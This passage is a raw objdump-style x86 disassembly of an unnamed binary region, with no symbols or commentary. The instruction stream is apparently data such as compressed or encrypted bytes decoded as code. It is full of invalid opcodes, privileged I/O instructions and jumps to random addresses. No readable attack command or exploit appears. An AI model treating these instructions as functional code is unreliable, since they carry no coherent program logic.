  4062e8:	mov    es,WORD PTR [esi]
  4062ea:	js     0x40630f
  4062ec:	test   al,0xc4
  4062ee:	dec    edi
  4062ef:	pop    esp
  4062f0:	mov    bl,0x8e
  4062f2:	aam    0x2b
  4062f4:	mov    eax,ds:0x912bd6e6
  4062f9:	mov    BYTE PTR [edx-0x75f437c1],ch
  4062ff:	adc    edx,ebp
  406301:	pop    ecx
  406302:	jp     0x40629e
  406304:	stos   BYTE PTR es:[edi],al
  406305:	adc    DWORD PTR ds:0xea620082,edi
  40630b:	sub    edi,ebx
  40630d:	retf   0x2be3
  406310:	stc    
  406311:	je     0x40632c
  406313:	pop    eax
  406314:	bound  eax,QWORD PTR [esp+esi*1]
  406317:	imul   eax,DWORD PTR [ebx],0xc09a89af
  40631d:	in     al,0x38
  40631f:	pushf  
  406320:	mov    eax,DWORD PTR [edx+0x70]
  406323:	and    eax,DWORD PTR [bx+si+0x68]
  406327:	lea    ebx,fs:[ebp+0x4c]
  40632b:	sbb    esi,DWORD PTR [ebx+0x565b7da9]
  406331:	add    DWORD PTR [ebx+0x6dea099c],eax
  406337:	sar    eax,cl
  406339:	fimul  DWORD PTR [ebx-0x7a2504c5]
  40633f:	int    0x8c
  406341:	test   BYTE PTR [eax],0x0
	...
  40636c:	xchg   edx,eax
  40636d:	add    DWORD PTR [esi-0x39],ebx
  406370:	cmp    BYTE PTR ds:0x4e02282c,cl
  406376:	add    esp,DWORD PTR [ebx]
  406378:	mov    al,0x61
  40637a:	xor    esp,eax
  40637c:	and    esp,DWORD PTR [edi+0x33]
  40637f:	jecxz  0x40633a
  406381:	mov    edi,0xa5ff831f
  406386:	jmp    0xc3dc8b75
  40638b:	fld    QWORD PTR [edx-0x7c]
  40638e:	mov    eax,eax
  406390:	jmp    0x4063f3
  406392:	and    esi,DWORD PTR [ebx+0x658d63f3]
  406398:	aas    
  406399:	add    BYTE PTR [eax],dl
  40639b:	(bad)  
  40639c:	out    dx,eax
  40639d:	pop    edx
  40639e:	inc    esi
  40639f:	cmc    
  4063a0:	cld    
  4063a1:	fwait
  4063a2:	add    eax,0xfbd302ea
  4063a7:	fiadd  DWORD PTR [ebp-0xbff06c6]
  4063ad:	lahf   
  4063ae:	lea    edx,[eax+ecx*4-0x6abbebf9]
  4063b5:	push   edi
  4063b6:	push   esi
  4063b7:	sub    dh,dl
  4063b9:	xchg   ebp,eax
  4063ba:	or     DWORD PTR [ebx],eax
  4063bc:	push   edi
  4063bd:	sar    al,1
  4063bf:	xor    ebx,DWORD PTR ds:0xef33fa78
  4063c5:	aad    0x8c
  4063c7:	movhps xmm7,QWORD PTR [ecx+0x1464d8a1]
  4063ce:	cmp    al,0xc1
	...
  4063f8:	add    BYTE PTR [eax],al
  4063fa:	es push ecx
  4063fc:	add    ecx,edx
  4063fe:	fcomp  QWORD PTR [ebx+esi*1+0x339f34f9]
  406405:	cli    
  406406:	rol    dl,cl
  406408:	pop    ds
  406409:	enter  0x881c,0xe7
  40640d:	add    edx,DWORD PTR [ecx+0x4bc3c14a]
  406413:	push   edi
  406414:	(bad)  [ebx+0x23fa683e]
  40641a:	cmp    eax,0x9b8df868
  40641f:	pop    esp
  406420:	out    0xcd,al
  406422:	ss jp  0x406427
  406425:	inc    esi
  406426:	dec    ebx
  406427:	call   0xfb8b:0x972405c0
  40642e:	and    al,0x9f
  406430:	and    edi,ecx
  406432:	and    al,0xa0
  406434:	lea    edx,[eax+ebx*1-0x5bc8f874]
  40643b:	push   esi
  40643c:	push   esi
  40643d:	cmp    BYTE PTR [esi-0x38fcf669],dl
  406443:	into   
  406444:	clc    
  406445:	xor    ebx,DWORD PTR [ebp-0x60cc058a]
  40644b:	aam    0x8c
  40644d:	(bad)  
  40644f:	in     eax,dx
  406450:	add    eax,0x4970cad5
  406455:	or     al,0x7f
  406457:	mov    dl,0x9
  406459:	add    eax,DWORD PTR [eax+ebp*8+0x33bc]
	...
  406488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406489:	nop
  40648a:	mov    ebx,0x96fea433
  40648f:	pop    ds
  406490:	stos   DWORD PTR es:[edi],eax
  406491:	pop    edi
  406492:	pop    ebp
  406493:	inc    ebp
  406494:	cmp    eax,0x7dc0e39e
  406499:	pop    edi
  40649a:	add    al,0xd9
  40649c:	mov    ch,0xa
  40649e:	hlt    
  40649f:	cli    
  4064a0:	sbb    eax,0xc3f8f41a
  4064a5:	idiv   edi
  4064a7:	add    al,0x57
  4064a9:	adc    BYTE PTR [edx+0x3],ch
  4064ac:	clc    
  4064ad:	addr16 ret 0x43c0
  4064b1:	jno    0x406477
  4064b3:	mov    edx,DWORD PTR [ebp-0x80]
  4064b6:	mov    ebx,0xbc804723
  4064bb:	lea    ebp,[edx+0x29a3bb64]
  4064c1:	push   edi
  4064c2:	add    al,0x56
  4064c4:	inc    esi
  4064c5:	xor    eax,ebp
  4064c7:	or     DWORD PTR ds:0x6df88c42,edi
  4064cd:	push   0x7a4dfae3
  4064d2:	mov    DWORD PTR [ecx+eax*2-0x5e90fd65],ecx
  4064d9:	jno    0x406520
  4064db:	sbb    al,0xff
  4064dd:	mov    bl,0x6
  4064df:	add    eax,DWORD PTR [edx+ebp*8]
  4064e2:	mov    ecx,0xbc51f733
  4064e7:	xor    esp,esp
  4064e9:	not    DWORD PTR [edi+0x1f]
	...
  406513:	add    BYTE PTR [eax],al
  406515:	add    BYTE PTR [esi+edi*1+0x5b3d8cea],dh
  40651c:	inc    edi
  40651d:	hlt    
  40651e:	(bad)  
  40651f:	cwde   
  406520:	cmc    
  406521:	add    ah,bh
  406523:	rcl    BYTE PTR [eax-0x6dd7380d],1
  406529:	mov    edx,eax
  40652b:	push   esp
  40652c:	sub    edi,ebp
  40652e:	mov    bh,0x5c
  406530:	jmp    0x3d00:0xa99a523d
  406537:	cwde   
  406538:	bound  edi,QWORD PTR [ebx-0x43e59db3]
  40653e:	ret    
  40653f:	(bad)  
  406540:	test   BYTE PTR [eax+edx*4-0x17fc9216],0x3a
  406548:	sub    dl,al
  40654a:	inc    ebp
  40654b:	pop    eax
  40654c:	sbb    DWORD PTR [ebx-0xcbdd78a],ecx
  406552:	addr16 into 
  406554:	gs pop es
  406556:	sbb    al,0xfa
  406558:	dec    ebx
  406559:	sub    DWORD PTR ds:0x7fc4d50d,edi
  40655f:	dec    ebx
  406560:	jmp    0xdbb:0xda61b5c9
  406567:	bound  ebx,QWORD PTR [eax+ebx*4+0x59]
  40656b:	dec    edi
  40656c:	shl    DWORD PTR [eax-0x460a7cd],0xfe
  406573:	xchg   edi,eax
  406574:	fiadd  WORD PTR [edx]
  406576:	pop    es
  406577:	shl    al,1
  406579:	repnz add BYTE PTR [eax],al
	...
  4065a4:	pop    ss
  4065a5:	sub    dl,ah
  4065a7:	mov    BYTE PTR [edx-0x3755daad],bh
  4065ad:	mov    dh,0xea
  4065af:	cmp    eax,0xffa99a3a
  4065b4:	cmp    al,0x98
  4065b6:	jb     0x406572
  4065b8:	sub    eax,0xbbbbfa62
  4065bd:	mov    BYTE PTR [eax],0xde
  4065c0:	push   edx
  4065c1:	mov    esi,ds
  4065c3:	and    bh,BYTE PTR ds:0xffa81005
  4065c9:	dec    edi
  4065ca:	add    edi,DWORD PTR [ecx-0x6dcc9d4c]
  4065d0:	int3   
  4065d1:	popa   
  4065d2:	lea    ebx,[ebp+0x40]
  4065d5:	sti    
  4065d6:	dec    edx
  4065d7:	inc    edx
  4065d8:	jecxz  0x406631
  4065da:	dec    esi
  4065db:	fld    QWORD PTR [edx+0x77ea1099]
  4065e1:	iret   
  4065e2:	cli    
  4065e3:	mov    edx,0x74f927d5
  4065e8:	test   eax,0x109d703b
  4065ed:	popf   
  4065ee:	add    esi,DWORD PTR [edi-0x93c656b]
  4065f4:	cmp    al,0x82
  4065f6:	mov    eax,DWORD PTR [eax+0x6c]
  4065f9:	popa   
  4065fa:	xor    eax,DWORD PTR [edx-0x4a]
  4065fd:	(bad)  
  4065fe:	pop    es
  4065ff:	das    
  406600:	sub    eax,eax
  406602:	sub    dl,ch
  406604:	sbb    esp,DWORD PTR [edi]
  406606:	shr    DWORD PTR [ecx],0x0
	...
  406631:	add    BYTE PTR [ecx+0x58],dl
  406634:	ret    
  406635:	jb     0x4065bb
  406637:	daa    
  406638:	stc    
  406639:	fiadd  DWORD PTR [ebp-0x8096b33]
  40663f:	and    BYTE PTR [ecx-0x3e8ec3ed],0x2b
  406646:	xor    al,0x5e
  406648:	shl    BYTE PTR [edx-0x1b],1
  40664b:	mov    ?,ebx
  40664d:	mov    edx,0xf68be8d7
  406652:	nop
  406653:	mov    ebp,edi
  406655:	mov    ch,0x3f
  406657:	test   eax,0x6bfda80c
  40665c:	add    esp,DWORD PTR [ebx+0x3355c7]
  406662:	dec    DWORD PTR [eax+edi*8-0x73]
  406666:	mov    esi,DWORD PTR [eax+0x5]
  406669:	sbb    eax,0x5e035b5f
  40666e:	out    dx,eax
  40666f:	sbb    eax,0x35e417c3
  406674:	mov    edi,ecx
  406676:	in     al,0x14
  406678:	xor    edi,ebx
  40667a:	pop    edx
  40667b:	fild   DWORD PTR [esi]
  40667d:	cmp    edi,esi
  40667f:	sub    ebx,ecx
  406681:	add    esp,DWORD PTR [ecx+0x3b]
  406684:	rol    al,0xa3
  406687:	pop    ebx
  406688:	ret    
  406689:	mov    ebp,DWORD PTR [esp+ecx*2]
  40668c:	clc    
  40668d:	xor    ecx,DWORD PTR [edi]
  40668f:	loop   0x406624
  406691:	pop    ss
  406692:	add    dh,dh
  406694:	(bad)  
	...
  4066be:	add    BYTE PTR [eax],al
  4066c0:	xchg   esp,eax
  4066c1:	test   al,0x30
  4066c3:	rcl    DWORD PTR [ebp+0x64],0x3
  4066c7:	rcr    ah,1
  4066c9:	push   ss
  4066ca:	xor    edi,ebx
  4066cc:	je     0x4066e2
  4066ce:	lea    ecx,[eax+ebx*2-0x775d83ea]
  4066d5:	pop    ebx
  4066d6:	dec    esi
  4066d7:	cmp    al,0x26
  4066d9:	push   ds
  4066da:	adc    BYTE PTR [ebx],al
  4066dc:	or     eax,0x1f33f9e4
  4066e1:	dec    esp
  4066e2:	clc    
  4066e3:	(bad)  
  4066e4:	retf   
  4066e5:	outs   dx,DWORD PTR ds:[esi]
  4066e6:	gs push esi
  4066e8:	jnp    0x406705
  4066ea:	add    ebx,DWORD PTR [esi+0x2f]
  4066ed:	sbb    eax,0x351417c3
  4066f2:	mov    edi,0xff0f28ff
  4066f7:	xor    ecx,DWORD PTR ds:0x1e33fb63
  4066fd:	loope  0x406682
  4066ff:	pop    es
  406700:	arpl   WORD PTR ds:0x453ef428,di
  406706:	std    
  406707:	sar    dh,0x41
  40670a:	add    bl,al
  40670c:	mov    cl,0x20
  40670e:	mov    ah,0xff
  406710:	jmp    0xe64c2169
  406715:	push   esp
  406716:	mov    eax,0x8c30b28d
  40671b:	jmp    DWORD PTR [eax*4+0x32a5601]
  406722:	ror    DWORD PTR [edx],0x0
	...
  40674d:	add    BYTE PTR ds:0xb9ff7414,bh
  406753:	call   0x4cf59b0b
  406758:	mov    ecx,0x87c6a633
  40675d:	psubusw mm4,QWORD PTR [edi+ecx*4]
  406761:	stos   DWORD PTR es:[edi],eax
  406762:	cmp    eax,0x7fc0fc7a
  406767:	push   eax
  406768:	add    dl,cl
  40676a:	leave  
  40676b:	mov    eax,0x7481ffb4
  406770:	mov    esp,0xba74770b
  406775:	(bad)  
  406776:	rol    BYTE PTR [eax-0x6],cl
  406779:	lahf   
  40677a:	int    0x97
  40677c:	add    BYTE PTR [esi+0x4a],bl
  40677f:	add    eax,0x15
  406782:	cmp    eax,0x51ff746b
  406787:	xor    BYTE PTR [ebx+esi*1+0x33b84c44],0x47
  40678f:	mov    esi,0xbfd077f
  406794:	pop    eax
  406795:	gs cmp eax,0xfec0f308
  40679b:	inc    eax
  40679c:	add    bl,al
  40679e:	loope  0x4067f1
  4067a0:	mov    bl,0xff
  4067a2:	sbb    DWORD PTR [esi],edx
  4067a4:	mov    edx,0x1a5c160b
  4067a9:	scas   eax,DWORD PTR es:[edi]
  4067aa:	mov    ebx,0xf295f5ef
  4067af:	addr16 popw es
	...
  4067da:	add    BYTE PTR [eax],al
  4067dc:	nop
  4067dd:	addr16 test al,0xc6
  4067e0:	inc    esp
  4067e1:	pop    esp
  4067e2:	cdq    
  4067e3:	jae    0x4067ce
  4067e5:	pop    eax
  4067e6:	mov    esi,0xe2542db3
  4067eb:	lods   eax,DWORD PTR ds:[esi]
  4067ec:	or     eax,0x41805c53
  4067f1:	(bad)  
  4067f2:	popf   
  4067f3:	mov    ds:0xdc2f5cc9,eax
  4067f8:	(bad)  
  4067f9:	sbb    ah,dh
  4067fb:	push   es
  4067fc:	test   BYTE PTR [eax],bl
  4067fe:	mov    ?,WORD PTR [ebx-0x5445a74f]
  406804:	xor    eax,0xb3adba52
  406809:	not    ebp
  40680b:	aam    0xfb
  40680d:	fisub  WORD PTR [ebx+0x7]
  406810:	lock pop esi
  406812:	sub    bh,al
  406814:	xor    ebx,DWORD PTR [eax+eax*2+0x73]
  406818:	sbb    DWORD PTR [eax+0x56],0xe2552db3
  40681f:	scas   al,BYTE PTR es:[edi]
  406820:	sub    eax,0x41887452
  406825:	test   al,0xbf
  406827:	pop    ebx
  406828:	rcr    DWORD PTR [ebx-0x51],1
  40682b:	jecxz  0x4068ab
  40682d:	sbb    esp,edi
  40682f:	push   es
  406830:	jge    0x40684a
  406832:	es mov bl,0x49
  406835:	pop    eax
  406836:	fisubr DWORD PTR [ebp+esi*1-0x345125ad]
  40683d:	out    dx,al
  40683e:	cmc    
  40683f:	mov    ds:0x0,eax
	...
  406868:	add    BYTE PTR [eax],al
  40686a:	sbb    BYTE PTR [edi-0x686ff8f9],al
  406870:	sub    dh,al
  406872:	xor    al,0x5c
  406874:	add    BYTE PTR [ecx],bl
  406876:	lea    ebx,[eax-0x1]
  406879:	out    dx,al
  40687a:	int3   
  40687b:	mov    edi,ebx
  40687d:	repnz fisttp DWORD PTR [ebx+0x68816cf8]
  406884:	adc    al,0x2a
  406886:	inc    ebx
  406887:	cld    
  406888:	add    bl,BYTE PTR [edi]
  40688a:	inc    edx
  40688b:	sbb    al,cl
  40688d:	test   BYTE PTR [eax+0x25],0xbf
  406891:	mov    esi,0xfaff57ac
  406896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406897:	arpl   cx,di
  406899:	cli    
  40689a:	mov    ds:0x63069be5,eax
  40689f:	push   0x8
  4068a1:	das    
  4068a2:	cmp    DWORD PTR [ecx+0x6d80a834],edi
  4068a8:	add    esi,DWORD PTR [eax-0x7900a7d4]
  4068ae:	in     al,dx
  4068af:	mov    edi,edx
  4068b1:	repnz ror BYTE PTR [ebx+0x5fc164f9],1
  4068b8:	sub    bh,0xe8
  4068bb:	dec    edi
  4068bc:	add    ebp,DWORD PTR [edi-0x183fe5d3]
  4068c2:	cmp    BYTE PTR [edi+edi*4],bl
  4068c5:	push   esi
  4068c6:	lods   al,BYTE PTR ds:[esi]
  4068c7:	push   edi
  4068c8:	call   FWORD PTR [edx]
  4068ca:	mov    ds:0xfaf863,eax
	...
  4068f7:	add    BYTE PTR [eax+0x66d693e5],bl
  4068fd:	dec    ecx
  4068fe:	cmp    dh,BYTE PTR [eax+eax*2-0x4f]
  406902:	sub    al,0x28
  406904:	jnp    0x40696a
  406906:	add    edi,DWORD PTR [ecx]
  406908:	int3   
  406909:	push   edi
  40690a:	call   FWORD PTR [esi]
  40690c:	mov    WORD PTR [ebx-0x75141d05],cs
  406912:	clc    
  406913:	pop    esp
  406914:	mov    cl,0x66
  406916:	mov    ebx,0x2a314500
  40691b:	add    edx,ecx
  40691d:	push   edx
  40691e:	rol    cl,0x20
  406921:	pop    esi
  406922:	retf   0x20bf
  406925:	or     eax,0x724ffff
  40692a:	or     edi,ecx
  40692c:	and    al,0x5
  40692e:	lea    ebx,[eax+esi*8-0x3792d17]
  406935:	pusha  
  406936:	pop    esi
  406937:	and    al,0x96
  406939:	and    BYTE PTR ds:0x7dd89e03,dl
  40693f:	or     dh,ah
  406941:	arpl   WORD PTR [ecx],ax
  406943:	pop    edi
  406944:	fistp  DWORD PTR [ecx+0x4f]
  406947:	or     dh,dl
  406949:	mov    bl,0xc
  40694b:	call   DWORD PTR [edx]
  40694d:	or     ecx,DWORD PTR [ebp-0x76a3988a]
  406953:	bswap  ebp
  406955:	or     al,0xff
  406957:	pop    edx
  406958:	pop    esi
  406959:	test   al,0x58
  40695b:	pop    edi
	...
  406984:	add    BYTE PTR [eax],al
  406986:	inc    ecx
  406987:	adc    al,dl
  406989:	or     al,0xa7
  40698b:	lods   eax,DWORD PTR ds:[esi]
  40698c:	mov    ebp,esp
  40698e:	and    al,0x23
  406990:	clc    
  406991:	push   edi
  406992:	leave  
  406993:	scas   eax,DWORD PTR es:[edi]
  406994:	mov    DWORD PTR [ebp-0x1d],0x6700005e
  40699b:	or     esi,DWORD PTR [ebp+0xc]
  40699e:	adc    BYTE PTR [esi+0x4a5ac7f8],bl
  4069a4:	mov    WORD PTR [ecx+0x57],es
  4069a7:	pop    ecx
  4069a8:	and    eax,DWORD PTR [ebp-0x78]
  4069ab:	and    eax,DWORD PTR ds:0x99f234
  4069b1:	mov    esp,ebp
  4069b3:	adc    eax,0x425ac7ef
  4069b8:	mov    WORD PTR [ecx+0x3e],es
  4069bb:	inc    esp
  4069bc:	mov    cl,0xdc
  4069be:	hlt    
  4069bf:	retf   
  4069c0:	leave  
  4069c1:	add    eax,0x43cf6a
  4069c6:	test   al,0xf0
  4069c8:	hlt    
  4069c9:	sgdtd  [edi+0x43]
  4069cd:	lea    edi,[edi+0x44]
  4069d0:	mov    bl,0xe1
  4069d2:	in     al,dx
  4069d3:	add    BYTE PTR [esp+ebx*1+0x2fc7eb5],bl
  4069da:	xor    DWORD PTR [eax],0x1d
  4069dd:	inc    eax
  4069de:	data16 cmp BYTE PTR [edi+0x41],0x3e
  4069e3:	je     0x406981
  4069e5:	inc    eax
  4069e6:	fist   DWORD PTR [eax+esi*4]
  4069e9:	add    DWORD PTR [eax],0x0
	...
  406a14:	adc    DWORD PTR [eax],0x43
  406a17:	call   0x43ae1e
  406a1c:	mov    ebp,0x4d40ac6e
  406a21:	push   ss
  406a22:	jl     0x406a81
  406a24:	mov    dh,0xc0
  406a26:	les    eax,FWORD PTR [eax-0x3b]
  406a29:	jle    0x406a27
  406a2b:	add    al,BYTE PTR [ebx]
  406a2d:	loopne 0x406a82
  406a2f:	push   0x42c6fa
  406a34:	out    dx,al
  406a35:	fisttp DWORD PTR [ecx]
  406a37:	in     eax,0x91
  406a39:	les    eax,FWORD PTR [edx]
  406a3b:	pop    ebp
  406a3c:	mov    al,BYTE PTR [ebp+0x2b34484]
  406a42:	add    eax,DWORD PTR [eax+0x75f898bd]
  406a48:	push   ebp
  406a49:	rcr    DWORD PTR [eax+ecx*1-0x5c7cb60e],0xba
  406a51:	mov    BYTE PTR [edx+0x0],0x3e
  406a55:	add    DWORD PTR [ebx],ebp
  406a57:	mul    BYTE PTR [esi-0x48]
  406a5a:	add    eax,DWORD PTR [eax]
  406a5c:	ds pop ebx
  406a5e:	bound  edi,QWORD PTR [ebx-0x63e1aabf]
  406a64:	cmp    al,0xcf
  406a66:	jecxz  0x4069eb
  406a68:	fst    st(7)
  406a6a:	pop    esp
  406a6b:	inc    edx
  406a6c:	ds pop ebx
  406a6e:	stos   BYTE PTR es:[edi],al
  406a6f:	sub    ebp,DWORD PTR [eax]
  406a71:	loope  0x406a16
  406a73:	call   esi
  406a75:	arpl   cx,bp
  406a77:	add    eax,DWORD PTR [eax]
	...
  406aa1:	add    BYTE PTR [esi],bh
  406aa3:	mov    BYTE PTR [ebx],bl
  406aa5:	mov    eax,0xffb1651f
  406aaa:	idiv   eax
  406aac:	push   0x605b7f81
  406ab1:	sbb    DWORD PTR [edx-0x1a],esi
  406ab4:	daa    
  406ab5:	add    al,0xd6
  406ab7:	mov    bl,0xe9
  406ab9:	add    edi,DWORD PTR [esi]
  406abb:	cli    
  406abc:	clc    
  406abd:	cmp    BYTE PTR [edi+0x5b],0x62
  406ac1:	sbb    DWORD PTR [edx],ecx
  406ac3:	out    0x27,al
  406ac5:	add    al,0xb5
  406ac7:	data16 loope 0x406a4a
  406aca:	jg     0x406b27
  406acc:	out    dx,al
  406acd:	mov    ebx,0xbce62149
  406ad2:	fisttp QWORD PTR [ebx-0x1dc1baa4]
  406ad8:	fcomi  st,st(7)
  406ada:	mov    dl,0x9a
  406adc:	jmp    0x64d3b65d
  406ae1:	inc    ebp
  406ae2:	ds cli 
  406ae4:	lods   al,BYTE PTR ds:[esi]
  406ae5:	cmp    bh,0x5a
  406ae8:	jb     0x406b03
  406aea:	(bad)  
  406aeb:	in     eax,0xa7
  406aed:	add    ecx,DWORD PTR [ecx+0x23]
  406af0:	out    0xb9,al
  406af2:	popf   
  406af3:	xchg   edi,eax
  406af4:	pop    esp
  406af5:	inc    ebp
  406af6:	ds loop 0x406ad4
  406af9:	inc    ebx
  406afa:	mov    bl,0x9a
  406afc:	jmp    0x949d1a
  406b01:	mov    esp,0x5c30c32d
	...
  406b2e:	add    BYTE PTR [eax],al
  406b30:	add    ebx,DWORD PTR [ebx-0x18]
  406b33:	fwait
  406b34:	cdq    
  406b35:	push   esp
  406b36:	inc    edx
  406b38:	mov    esi,DWORD PTR [ecx+ecx*8+0x555b3e2b]
  406b3f:	(bad)  
  406b40:	(bad)  
  406b42:	ret    
  406b43:	add    DWORD PTR [ebx-0x170100ad],edx
  406b49:	fild   WORD PTR [ebx]
  406b4b:	and    al,0xc6
  406b4d:	in     eax,0x40
  406b4f:	jmp    0x720ddad8
  406b54:	mov    esi,0xb5ee0099
  406b59:	arpl   dx,cx
  406b5b:	pusha  
  406b5c:	cmp    DWORD PTR [esi],esp
  406b5e:	test   BYTE PTR [edx+eax*4+0x5b],bl
  406b62:	mov    ebp,ebx
  406b64:	(bad)  
  406b65:	loop   0x406af3
  406b67:	sub    BYTE PTR [edx-0x66],al
  406b6a:	jne    0x406b00
  406b6c:	bound  ebx,QWORD PTR [ebx]
  406b6e:	jmp    FWORD PTR [esi+0x7403df98]
  406b74:	adc    eax,0x34e940e5
  406b79:	outs   dx,DWORD PTR ds:[esi]
  406b7a:	lea    ecx,ds:0xda009a30
  406b80:	inc    ecx
  406b81:	out    0x4b,al
  406b83:	ja     0x406b7f
  406b85:	pop    edx
  406b86:	xor    edx,ebp
  406b88:	mov    esi,0x3a288e9e
  406b8d:	mov    dl,al
  406b8f:	cwde   
  406b90:	jge    0x406b73
  406b92:	add    esi,DWORD PTR [eax+eax*1+0x0]
	...
  406bbe:	mov    ecx,0x2e940e4
  406bc3:	into   
  406bc4:	(bad)  
  406bc5:	bound  ecx,QWORD PTR [esi-0x75]
  406bc8:	lea    ebp,[eax+0x34e03d]
  406bce:	arpl   dx,bx
  406bd0:	inc    eax
  406bd1:	add    ah,cl
  406bd3:	dec    edx
  406bd4:	aaa    
  406bd5:	lea    esp,[esi+0x5b35ff57]
  406bdb:	fiadd  DWORD PTR [eax+0x0]
  406bde:	enter  0xfca2,0xff
  406be2:	adc    bl,BYTE PTR [edi-0x2dd8be73]
  406be8:	inc    ebp
  406be9:	clc    
  406bea:	mov    ?,edx
  406bec:	(bad)  
  406bed:	(bad)  
  406bee:	cmp    ch,dl
  406bf0:	(bad)  
  406bf1:	mov    esp,DWORD PTR [eax+0x9]
  406bf4:	shl    BYTE PTR [ebx],cl
  406bf6:	popa   
  406bf7:	cmp    eax,0x1d1cfc54
  406bfc:	add    eax,DWORD PTR [edx+ecx*4]
  406bff:	repz mov WORD PTR [ecx-0x19],es
  406c03:	pop    ebx
  406c04:	inc    ebp
  406c05:	clc    
  406c06:	loop   0x406bed
  406c08:	js     0x406b8c
  406c0a:	sub    eax,0x68fc7500
  406c0f:	call   0xc6c1:0xb1a89f8
  406c16:	jmp    0x84cc6aee
  406c1b:	push   ds
  406c1c:	ret    
  406c1d:	add    eax,0x754126d4
	...
  406c4a:	add    BYTE PTR [eax],al
  406c4c:	jmp    0x406c14
  406c4e:	in     al,dx
  406c4f:	dec    eax
  406c51:	add    BYTE PTR [ebx+0x33281cc6],cl
  406c57:	inc    ebp
  406c58:	mov    ebx,0xa303c14c
  406c5d:	shl    esp,1
  406c5f:	lea    esp,[esi+0x57]
  406c62:	add    eax,DWORD PTR [ebp+0xf]
  406c65:	pop    edx
  406c66:	mov    eax,ds:0xff70feeb
  406c6b:	jne    0x406c88
  406c6d:	rol    BYTE PTR [ebp-0x8],1
  406c70:	ds mov ebx,0x7a7ffc2f
  406c76:	push   cs
  406c77:	mov    esp,DWORD PTR [eax-0x33]
  406c7a:	mov    cl,0xc1
  406c7c:	jge    0x406cb5
  406c7e:	add    al,bl
  406c80:	dec    DWORD PTR [esi]
  406c82:	sar    DWORD PTR [ecx-0x527ea6],cl
  406c88:	mov    ch,0x81
  406c8a:	jns    0x406ce1
  406c8c:	cmp    cl,BYTE PTR [ebp+0x46]
  406c8f:	cld    
  406c90:	pop    ebp
  406c91:	xchg   ecx,eax
  406c92:	loope  0x406c59
  406c94:	xor    eax,0xb3040186
  406c99:	(bad)  
  406c9b:	inc    ecx
  406c9c:	ds inc ebp
  406c9e:	inc    esi
  406c9f:	clc    
  406ca0:	cmp    ebp,DWORD PTR [eax+0x70]
  406ca3:	sbb    edi,DWORD PTR [ecx-0x4e03c9c0]
  406ca9:	jle    0x406c57
  406cab:	mov    DWORD PTR [ebx+0x30],edi
  406cae:	ret    0xc6
	...
  406cd9:	add    BYTE PTR [eax-0x43],dl
  406cdc:	lods   eax,DWORD PTR ds:[esi]
  406cdd:	mov    ebp,ebp
  406cdf:	add    al,al
  406ce1:	add    eax,0x7541fc3d
  406ce6:	add    eax,0xd1ff9edb
  406ceb:	or     BYTE PTR [eax-0x3a],bh
  406cee:	mov    ch,0xe8
  406cf0:	out    dx,eax
  406cf1:	inc    esp
  406cf2:	ret    0xc134
  406cf5:	add    eax,DWORD PTR [edx-0x41]
  406cf8:	xchg   DWORD PTR [esi+0x450043ff],ecx
  406cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cff:	ss aad 0xc1
  406d02:	sbb    al,0xe
  406d04:	lods   al,BYTE PTR ds:[esi]
  406d05:	jne    0x406ca1
  406d07:	rol    BYTE PTR [esi-0x8],0xc7
  406d0b:	inc    esi
  406d0c:	scas   eax,DWORD PTR es:[edi]
  406d0d:	rol    DWORD PTR [eax-0x4a0187df],0x5a
  406d14:	pop    edx
  406d15:	ret    0x577d
  406d18:	jmp    0x4b02:0x39c7ffcb
  406d1f:	mov    ebx,DWORD PTR [edx+eax*2+0x3e]
  406d23:	pop    esp
  406d24:	cld    
  406d25:	test   edx,0x1302e99b
  406d2b:	xchg   ebx,eax
  406d2c:	fs inc edx
  406d2e:	ds out 0xa3,al
  406d31:	scas   eax,DWORD PTR es:[edi]
  406d32:	aas    
  406d33:	pop    eax
  406d34:	in     eax,0x7e
  406d36:	jg     0x406d93
  406d38:	jb     0x406d80
  406d3a:	ss pop ebx
  406d3c:	in     al,dx
  406d3d:	inc    ebx
	...
  406d66:	add    BYTE PTR [eax],al
  406d68:	mov    ebx,0xfdbae99a
  406d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d6e:	jb     0x406d0f
  406d70:	sbb    edi,eax
  406d72:	icebp  
  406d73:	fwait
  406d74:	pop    eax
  406d75:	and    cl,ch
  406d77:	add    edi,DWORD PTR [ebp+0x5835ee53]
  406d7d:	push   eax
  406d7e:	pop    esp
  406d7f:	cld    
  406d80:	loope  0x406df2
  406d82:	scas   al,BYTE PTR es:[edi]
  406d83:	add    al,0x3e
  406d85:	fs test eax,0xce134131
  406d8b:	stos   DWORD PTR es:[edi],eax
  406d8c:	loope  0x406dde
  406d8e:	rcl    BYTE PTR [edi],cl
  406d90:	lds    ebx,FWORD PTR [ebx+0x1b4593ed]
  406d96:	cmp    al,0x3
  406d98:	xchg   BYTE PTR [eax-0x52],dl
  406d9b:	stos   DWORD PTR es:[edi],eax
  406d9c:	rol    DWORD PTR [ebp+ebp*8+0x7e],0x3e
  406da1:	in     al,0xe8
  406da3:	mov    esp,0x50e9577c
  406da8:	mov    ch,0x3f
  406daa:	push   0xffffffc0
  406dac:	scas   al,BYTE PTR es:[edi]
  406dad:	lods   al,BYTE PTR ds:[esi]
  406dae:	mov    edx,0x135924ce
  406db3:	add    eax,0x81005d24
  406db8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406db9:	and    DWORD PTR [eax],eax
  406dbb:	jmp    0xdd3fc178
  406dc0:	inc    ebx
  406dc1:	inc    esp
  406dc2:	bound  esi,QWORD PTR [edx-0x7e]
  406dc5:	lds    edx,FWORD PTR [eax]
  406dc7:	dec    DWORD PTR fs:[edx+0x50]
  406dcb:	inc    ecx
	...
  406df4:	add    BYTE PTR [eax],al
  406df6:	pop    ds
  406df7:	cmp    eax,0x181c46ff
  406dfc:	inc    ebp
  406dfd:	cmp    DWORD PTR [eax],edi
  406dff:	pop    ebx
  406e00:	mov    esp,DWORD PTR [ebp+ebp*1-0x3d383327]
  406e07:	popf   
  406e08:	repnz push 0x67
  406e0b:	pop    edi
  406e0c:	add    BYTE PTR [ebp-0x1abb1bc2],dl
  406e12:	enter  0x836f,0x8c
  406e16:	sub    DWORD PTR [eax+0x74],edx
  406e19:	repz ror ch,0x8
  406e1d:	jmp    0xcd2bc570
  406e22:	test   al,0x5f
  406e24:	push   DWORD PTR [ebp+eax*1+0x38]
  406e28:	ins    BYTE PTR es:[edi],dx
  406e29:	out    0xa4,al
  406e2b:	dec    edi
